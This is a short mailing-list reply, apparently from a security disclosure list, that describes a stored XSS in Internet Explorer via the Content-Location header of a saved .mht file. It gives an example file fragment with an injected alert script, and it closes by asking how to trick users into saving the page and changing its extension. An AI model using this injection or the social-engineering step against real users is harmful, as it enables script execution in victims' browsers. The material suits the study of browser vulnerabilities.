Subject: Re: Saved XSS vulnerability in Internet Explorer

Hi there,

It works because there is "Content-Location" header in .mht file so
our malicious code will be there.
"Content-Location" is outside <html></html> so it will work only in IE
(with .htm extension ofcourse).

Example code of .mht file with XSS:

[...]
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Content-Location:
http://localhost/test/index.php?--><script>alert("XSS")</script>

=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML =
xmlns=3D"http://www.w3.org/1999/xhtml">
[...]
</HTML>

Question is: How to convince user to sava our page on his hdd and
change extension to .html?

Regards
